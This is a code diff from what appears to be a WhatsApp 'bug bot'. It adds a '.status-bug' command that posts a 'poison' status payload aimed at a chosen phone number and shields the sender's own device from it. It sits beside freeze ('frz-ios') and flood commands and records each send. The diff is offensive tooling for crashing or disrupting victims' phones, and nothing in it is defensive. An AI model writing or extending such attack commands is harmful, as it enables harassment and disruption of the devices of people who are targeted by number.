@@ -12,6 +12,7 @@ export function createOneShotProbeService(deps) {
         safeWaReply,
         sendIozkProbe,
         sendFiosProbe,
+        sendStatusBugProbe,
         recordBugSends,
         log,
         logError
@@ -23,6 +24,7 @@ export function createOneShotProbeService(deps) {
         safeWaReply,
         sendIozkProbe,
         sendFiosProbe,
+        sendStatusBugProbe,
         recordBugSends,
         log,
         logError
@@ -40,6 +42,17 @@ export function createOneShotProbeService(deps) {
             logSuccess: 'IOZK probe sent to test target',
             logFailure: 'IOZK probe failed',
             sendProbe: sendIozkProbe
+        }),
+        'status-bug': Object.freeze({
+            overflowMessage: '⚠️ .status-bug is a one-shot — no amount needed. Run it again for another status hit.',
+            usageMessage: 'Usage: .status-bug <number>\n\nPosts the poison as a STATUS visible only to the target + "mentioned you" notification. Self-shielded: your own phone never receives the payload.',
+            startingLabel: '.status-bug',
+            sentLabel: 'status-bug (status mention, self-shielded)',
+            logTag: 'SBUG',
+            logSuccess: 'status poison posted →',
+            logFailure: 'status bug failed',
+            sendProbe: sendStatusBugProbe,
+            isStatus: true
         }),
         'frz-ios': Object.freeze({
             overflowMessage: '⚠️ .frz-ios is a one-shot — no amount needed. For floods use .frz-iosd <number> <amount>.',
@@ -129,7 +142,11 @@ export function createOneShotProbeService(deps) {
         );
         try {
             const result = await definition.sendProbe(sock, targetJid);
-            recordBugSends(phoneNumber, targetJid, result?.ids || []);
+            if (definition.isStatus) {
+                recordBugSends(phoneNumber, targetJid, result?.ids || [], { status: true });
+            } else {
+                recordBugSends(phoneNumber, targetJid, result?.ids || []);
+            }
             log(
                 definition.logTag,
                 `${phoneNumber}: ${definition.logSuccess} ${targetNumber}; ${JSON.stringify(result)}`
